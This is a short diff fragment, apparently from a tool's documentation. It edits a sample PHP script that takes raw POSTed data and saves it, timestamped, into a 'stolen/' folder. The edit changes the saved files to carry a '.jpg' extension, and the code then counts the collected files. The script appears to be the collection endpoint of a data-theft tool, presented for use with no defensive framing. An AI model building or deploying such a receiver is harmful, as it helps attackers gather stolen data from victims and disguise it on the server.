@@ -95,7 +95,7 @@ for version2:
 sample of file.php:
 <?php
 $inp = file_get_contents("php://input");
-file_put_contents("stolen/" . time(), $inp);
+file_put_contents("stolen/" . time() . ".jpg", $inp);
 
 $file = scandir("stolen/");
 if(sizeof($file) > 52)
